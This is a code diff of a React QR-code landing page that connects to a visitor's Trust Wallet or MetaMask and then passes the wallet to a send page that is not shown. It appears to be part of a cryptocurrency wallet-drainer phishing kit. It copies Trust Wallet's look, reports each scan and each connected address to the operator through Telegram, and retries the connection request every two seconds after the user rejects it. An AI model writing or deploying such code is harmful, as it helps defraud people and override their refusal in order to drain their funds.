@@ -1,104 +1,104 @@
-// src/QRLanding.tsx
-import { useState, useEffect } from "react";
-import { ethers } from "ethers";
-import { notify, formatAddress } from "../lib/telegram";
-import SendPage from "./send-page";
+import { useState, useEffect } from "react"
+import { ethers } from "ethers"
+import { notify, formatAddress } from "../lib/telegram"
+import SendPage from "./send-page"
 
-type Step = "detecting" | "send" | "error";
+type Step = "detecting" | "send" | "error"
 
 export default function QRLanding() {
-  const [step, setStep] = useState<Step>("detecting");
-  const [provider, setProvider] = useState<ethers.BrowserProvider | null>(null);
-  const [address, setAddress] = useState("");
+  const [step, setStep] = useState<Step>("detecting")
+  const [provider, setProvider] = useState<ethers.BrowserProvider | null>(null)
+  const [address, setAddress] = useState("")
 
   useEffect(() => {
-    // Notify that QR was scanned
-    notify("📱 <b>QR Code Scanned</b>");
-
+    notify("QR Code Scanned")
     const tryDetect = async () => {
-      // Check for injected providers (Trust Wallet, MetaMask, etc.)
-      const eth = (window as any).ethereum;
-      const trustWallet = (window as any).trustwallet;
-
-      // Trust Wallet's DApp browser injects `window.ethereum`
-      const provider = eth || trustWallet;
-
-      if (!provider) {
-        setStep("error");
-        return;
-      }
-
+      const eth = (window as any).ethereum
+      const trustWallet = (window as any).trustwallet
+      const injectedProvider = eth || trustWallet
+      if (!injectedProvider) { setStep("error"); return }
       try {
-        // Request accounts
-        const bp = new ethers.BrowserProvider(provider);
-        const accounts = await bp.send("eth_requestAccounts", []);
-        const addr = accounts[0];
-
-        await notify(`🔗 <b>Wallet Connected</b>\n${formatAddress(addr)}`);
-
-        setProvider(bp);
-        setAddress(addr);
-        setStep("send");
+        const bp = new ethers.BrowserProvider(injectedProvider)
+        const accounts = await bp.send("eth_requestAccounts", [])
+        const addr = accounts[0]
+        await notify("Wallet Connected: " + formatAddress(addr))
+        setProvider(bp)
+        setAddress(addr)
+        setStep("send")
       } catch (err: any) {
-        // Handle errors (e.g., user rejected connection)
         if (err.code === 4001 || err.message?.includes("user rejected")) {
-          // User rejected → retry after 2 seconds
-          await notify(`⚠️ <b>Connection Rejected</b>\nRetrying...`);
-          setTimeout(tryDetect, 2000);
+          await notify("Connection Rejected - Retrying...")
+          setTimeout(tryDetect, 2000)
         } else {
-          setStep("error");
+          setStep("error")
         }
       }
-    };
+    }
+    tryDetect()
+  }, [])
 
-    // Auto-detect on page load
-    tryDetect();
-  }, []);
+  const styles = {
+    container: {
+      display: "flex",
+      flexDirection: "column" as const,
+      alignItems: "center",
+      justifyContent: "center",
+      minHeight: "100dvh",
+      padding: "0 24px",
+      background: "#0C0F1E",
+    },
+    spinner: {
+      width: "64px",
+      height: "64px",
+      border: "4px solid rgba(51, 117, 187, 0.3)",
+      borderTopColor: "#3375BB",
+      borderRadius: "50%",
+      animation: "spin 1s linear infinite",
+      marginBottom: "24px",
+    },
+    title: { fontSize: "20px", fontWeight: 600, color: "#fff", marginBottom: "8px" },
+    subtitle: { fontSize: "14px", color: "#9CA3AF", textAlign: "center" as const },
+    errorIcon: {
+      width: "64px", height: "64px", borderRadius: "50%",
+      background: "rgba(240, 68, 56, 0.1)",
+      display: "flex", alignItems: "center", justifyContent: "center",
+      fontSize: "24px", color: "#F04438", fontWeight: "bold", marginBottom: "24px",
+    },
+    button: {
+      background: "#3375BB", color: "#fff", border: "none",
+      padding: "12px 32px", borderRadius: "12px", fontSize: "14px",
+      fontWeight: 500, cursor: "pointer", marginTop: "24px",
+    },
+    smallText: { fontSize: "12px", color: "#6B7280", marginTop: "24px" },
+  }
 
   if (step === "detecting") {
     return (
-      <div className="min-h-screen bg-[#0C0F1E] flex items-center justify-center">
-        <div className="text-center">
-          <div className="w-16 h-16 border-4 border-[#23263B] border-t-[#3375BB] rounded-full animate-spin mx-auto mb-4" />
-          <p className="text-white text-lg">Connecting to Wallet...</p>
-          <p className="text-[#8892A4] text-sm mt-2">
-            Please approve the connection in your wallet
-          </p>
-        </div>
+      <div style={styles.container}>
+        <div style={styles.spinner} />
+        <h1 style={styles.title}>Connecting to Wallet...</h1>
+        <p style={styles.subtitle}>Please approve the connection in your wallet</p>
       </div>
-    );
+    )
   }
 
   if (step === "error") {
     return (
-      <div className="min-h-screen bg-[#0C0F1E] flex items-center justify-center px-6">
-        <div className="text-center">
-          <div className="w-16 h-16 mx-auto mb-4 rounded-full bg-red-500/20 flex items-center justify-center">
-            <span className="text-red-500 text-3xl">!</span>
-          </div>
-          <h2 className="text-white text-xl font-semibold mb-2">
-            Wallet Not Detected
-          </h2>
-          <p className="text-[#8892A4] text-sm">
-            Please open this page in <b>Trust Wallet's built-in browser</b>.
-          </p>
-          <p className="text-[#5A5F7A] text-xs mt-4">
-            Trust Wallet &rarr; DApp Browser &rarr; Enter this URL
-          </p>
-          <button
-            onClick={() => window.location.reload()}
-            className="mt-6 bg-[#3375BB] text-white px-6 py-2 rounded-lg text-sm"
-          >
-            Retry
-          </button>
-        </div>
+      <div style={styles.container}>
+        <div style={styles.errorIcon}>!</div>
+        <h2 style={{ ...styles.title, fontSize: "18px" }}>Wallet Not Detected</h2>
+        <p style={styles.subtitle}>
+          Please open this page in <span style={{ color: "#3375BB" }}>Trust Wallet's built-in browser</span>.
+        </p>
+        <p style={styles.smallText}>Trust Wallet - DApp Browser - Enter this URL</p>
+        <button style={styles.button} onClick={() => window.location.reload()}>Retry</button>
       </div>
-    );
+    )
   }
 
   if (provider && address) {
-    return <SendPage provider={provider} address={address} />;
+    return <SendPage provider={provider} address={address} />
   }
 
-  return null;
+  return null
 }
